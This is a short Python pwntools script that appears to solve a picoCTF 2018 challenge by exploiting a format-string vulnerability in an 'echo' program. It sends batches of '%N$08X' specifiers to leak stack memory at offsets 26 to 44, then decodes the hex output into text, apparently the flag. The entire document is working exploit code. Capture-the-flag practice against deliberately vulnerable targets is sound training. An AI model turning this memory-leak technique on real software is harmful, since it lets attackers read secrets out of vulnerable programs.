import pwn
import re


def batch(it, siz):
    l = len(it)
    for i in range(0, l, siz):
        yield it[i:i+siz]


fmt = ".%{0}$08X"
# p = pwn.tubes.remote.remote("2018shell.picoctf.com", 23397)
p = pwn.tubes.process.process(["./echo"], shell=True)
prompt = p.read()
octet_fmt_strings = [fmt.format(i).encode() for i in range(26, 45)]
for format_string_list in batch(octet_fmt_strings, 5):
    payload = b"".join(format_string_list)
    p.sendline(payload)
    out = p.read()
    hex_vals = re.findall(b'[0-9A-F]+', out)
    decoded_strings = [bytes.fromhex(i.decode()).decode('ISO-8859-1')[::-1] for
                       i in hex_vals]
    decoded_string = ''.join(decoded_strings)
    print(decoded_string, end='')

print("")
p.close()

